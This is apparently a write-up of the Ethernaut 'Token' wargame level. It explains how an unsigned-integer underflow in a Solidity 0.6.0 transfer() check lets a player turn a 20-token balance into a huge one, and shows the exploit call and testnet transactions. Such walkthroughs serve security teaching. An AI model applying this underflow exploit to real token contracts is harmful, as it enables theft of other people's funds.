# Token

## Objectives

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

## Solution

This contract is using the solidity compiler version 0.6.0, therefore mathematical operations can lead to overflows. In this case, the vulnerability occurs when attempting to call the `transfer()` function:

```cs
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

The line `require(balances[msg.sender] - _value >= 0);` checks if the user balance is larger than or equal to zero, but since balances are unsigned integers, when the number we subtract (`_value`) is larger than the wallet's balance (`balances[msg.sender]`) of the token, an overflow occurs and the wallet's balance becomes the largest unsigned integer minus the difference between these two values. 

After passing the require statement, there is another mistake where this overflowed value is assigned to the balance of `msg.sender`:

```cs
balances[msg.sender] -= _value;
```

All we have to do to exploit the contract is call the transfer function as follows:

```cs
transfer('any address except the sending address', 21)
```

From the address whose funds we want to cause the overflow on.

## How I did it

1. I called the `transfer()` function and sent 21 tokens (1 more than the original 20 to cause an overflow) to the contract address of the Token contract.

```cs
token.transfer(EthernautContractAddresses['token'], 21, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662

2. Check that we have actually caused an overflow by checking if our balance is above 20.

```python
amount_assertion = token.balanceOf(acc.address) > 20
print(f'Does address {acc.address} have more than 20 tokens?: {amount_assertion}')
```


### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x50dacc40fa0b3e919a98709ae45ac9efcb9c6d4bb2ec5248176b0aefa158c58a
